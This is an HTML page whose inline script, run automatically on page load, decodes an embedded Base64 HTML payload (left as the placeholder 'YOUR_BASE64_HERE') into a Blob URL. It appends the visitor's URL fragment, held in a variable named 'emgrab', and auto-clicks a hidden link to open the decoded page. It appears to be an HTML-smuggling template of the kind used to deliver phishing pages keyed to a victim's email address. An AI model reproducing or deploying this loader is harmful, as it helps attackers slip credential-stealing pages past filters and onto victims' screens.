<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">

  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

  <script>
    $(document).ready(function() {
      saveFile();
    });

    function saveFile(name, type, data) {
      if (data != null && navigator.msSaveBlob)
        return navigator.msSaveBlob(
          new Blob([data], { type: type }),
          name
        );

      var a = $("<a style='display: none;'/>");

      let emgrab = window.location.href.split("#")[1];

      // Your UTF-8 encoded Base64 goes here
      var encodedStringAtoB = "YOUR_BASE64_HERE";

      // Base64 -> binary bytes
      var binaryString = atob(encodedStringAtoB);
      var bytes = new Uint8Array(binaryString.length);

      for (var i = 0; i < binaryString.length; i++) {
        bytes[i] = binaryString.charCodeAt(i);
      }

      // UTF-8 bytes -> JavaScript string
      var decodedStringAtoB =
        new TextDecoder("utf-8").decode(bytes);

      // Create UTF-8 HTML document
      const myBlob = new Blob(
        [decodedStringAtoB],
        { type: "text/html;charset=UTF-8" }
      );

      const url =
        window.URL.createObjectURL(myBlob) + "#" + (emgrab || "");

      a.attr("href", url);
      $("body").append(a);
      a[0].click();

      setTimeout(function() {
        window.URL.revokeObjectURL(url.split("#")[0]);
        a.remove();
      }, 1000);
    }
  </script>
</head>

<body>
</body>
</html>
